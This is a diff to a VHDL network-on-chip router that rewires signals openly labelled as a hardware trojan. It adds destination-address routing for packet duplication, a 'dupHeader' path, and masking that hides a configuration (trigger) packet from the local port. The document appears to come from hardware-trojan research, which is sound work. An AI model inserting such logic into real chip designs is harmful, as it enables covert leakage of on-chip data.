@@ -68,7 +68,9 @@ signal free: regNport := (others=>'0');
 -- trojan signals
 signal duplicate, dataSel, data_ack_local, maskPkg : std_logic := '0';
 signal configPkg, txCrossbar : regNport := (others=>'0');
-signal maliciousHeader : regflit := (others=>'0');
+signal dupHeader : regflit := (others=>'0');
+signal destAddr : arrayNport_regmetadeflit := (others=>(others=>'0'));
+signal dest : regmetadeflit := (others=>'0');
 
 begin
 
@@ -77,6 +79,7 @@ begin
 		clock => clock,
 		reset => reset,
 		configPkg => configPkg(0),
+		destAddr => destAddr(0),
 		address => address,
 		data_in => data_in(0),
 		rx => rx(0),
@@ -94,6 +97,7 @@ begin
 		clock => clock,
 		reset => reset,
 		configPkg => configPkg(1),
+		destAddr => destAddr(1),
 		address => address,
 		data_in => data_in(1),
 		rx => rx(1),
@@ -111,6 +115,7 @@ begin
 		clock => clock,
 		reset => reset,
 		configPkg => configPkg(2),
+		destAddr => destAddr(2),
 		address => address,
 		data_in => data_in(2),
 		rx => rx(2),
@@ -128,6 +133,7 @@ begin
 		clock => clock,
 		reset => reset,
 		configPkg => configPkg(3),
+		destAddr => destAddr(3),
 		address => address,
 		data_in => data_in(3),
 		rx => rx(3),
@@ -145,6 +151,7 @@ begin
 		clock => clock,
 		reset => reset,
 		configPkg => configPkg(4),
+		destAddr => destAddr(4),
 		address => address,
 		data_in => data_in(4),
 		rx => rx(4),
@@ -162,6 +169,7 @@ begin
 		clock => clock,
 		reset => reset,
 		duplicate => duplicate,
+		dupAddr => dupHeader(METADEFLIT-1 downto 0),
 		h => h,
 		ack_h => ack_h,
 		address => address,
@@ -196,17 +204,27 @@ begin
 		clock 			=> clock,
         reset 			=> reset,
         data_in 		=> data_outCrossbar(LOCAL),
+        destAddr		=> dest,
+        dupHeader		=> dupHeader,
         duplicate 		=> duplicate,
     	free			=> free,
 		mux_in 			=> mux_in,
 		mux_out 		=> mux_out,
         configPkg 		=> configPkg,
         creditIn 		=> data_ack, -- or credit_i
-        data_out 		=> maliciousHeader,
         dataSel			=> dataSel,
       	fakeCredit 		=> data_ack_local,
-      	maskPkg			=> maskPkg
+      	maskPkg_o		=> maskPkg,
+      	h				=> h(4),
+      	h_ack			=> ack_h(4)
 	);
+
+	-- Mux to define the address source
+	dest <= destAddr(0) when configPkg(0) = '1' else
+			destAddr(1) when configPkg(1) = '1' else
+			destAddr(2) when configPkg(2) = '1' else
+			destAddr(3) when configPkg(3) = '1' else
+			destAddr(4);
 
 	-- To ofuscate the configuration packet
 	tx(LOCAL) <= txCrossbar(LOCAL) AND maskPkg;
